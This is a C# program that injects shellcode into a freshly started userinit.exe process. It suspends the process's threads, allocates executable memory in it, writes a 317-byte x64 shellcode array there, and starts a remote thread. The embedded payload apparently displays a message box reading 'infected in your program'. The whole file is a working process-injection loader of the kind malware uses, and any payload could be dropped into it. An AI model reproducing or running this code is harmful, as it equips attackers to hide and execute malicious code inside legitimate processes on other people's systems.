using System.Diagnostics;
using System.Runtime.InteropServices;
using System;
using System.Text;
using System.Threading;


public class Program
{

    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openthread
    [DllImport("kernel32.dll")]
    //static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-suspendthread
    [DllImport("kernel32.dll")]
    static extern uint SuspendThread(IntPtr hThread);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-resumethread
    [DllImport("kernel32.dll")]
    static extern int ResumeThread(IntPtr hThread);

    //https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-zwunmapviewofsection
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);


    [DllImport("kernel32.dll")]
    //public static extern IntPtr VirtualAllocEx(IntPtr lpHandle,IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    private static UInt32 SUSPEND_RESUME = 0x0002;

    public static void Main()
    {


        byte[] shellcode = new byte[317] {
0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
0x85,0x25,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x75,0x6e,0x34,
0x63,0x6b,0x6e,0x30,0x77,0x6c,0x33,0x7a,0x20,0x69,0x6e,0x66,0x65,0x63,0x74,
0x65,0x64,0x20,0x69,0x6e,0x20,0x79,0x6f,0x75,0x72,0x20,0x70,0x72,0x6f,0x67,
0x72,0x61,0x6d,0x20,0x21,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,
0x78,0x00 };


        string proc = "userinit.exe";

        Process newproc;
        newproc = Process.Start(proc);
        Console.WriteLine("Started " + proc + " with Process Id:" + newproc.Id);
        Console.WriteLine("Suspending process...");
        foreach (ProcessThread thread in newproc.Threads)
        {
            IntPtr pOpenThread;
            pOpenThread = OpenThread(SUSPEND_RESUME, false, (uint)thread.Id);
            if (pOpenThread == IntPtr.Zero)
            {
                break;
            }
            SuspendThread(pOpenThread);
        }
        Console.WriteLine("Suspended!");

        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, newproc.Id);

        IntPtr spaceAddr = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Console.WriteLine("Allocating memory");
        WriteProcessMemory(procHandle, spaceAddr, shellcode, new IntPtr(shellcode.Length), 0);
        Console.WriteLine("Copied shellcode in memory");
        IntPtr pinfo = IntPtr.Zero;
        IntPtr threatH = CreateRemoteThread(procHandle, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
        Console.WriteLine("Created remote thread");
        Console.WriteLine("Resuming process...");

        foreach (ProcessThread thread in newproc.Threads)
        {
            IntPtr pOpenThread;
            pOpenThread = OpenThread(SUSPEND_RESUME, false, (uint)thread.Id);
            if (pOpenThread == IntPtr.Zero)
            {
                break;
            }
            ResumeThread(pOpenThread);
        }
        Console.WriteLine("Resumed!");


    }

}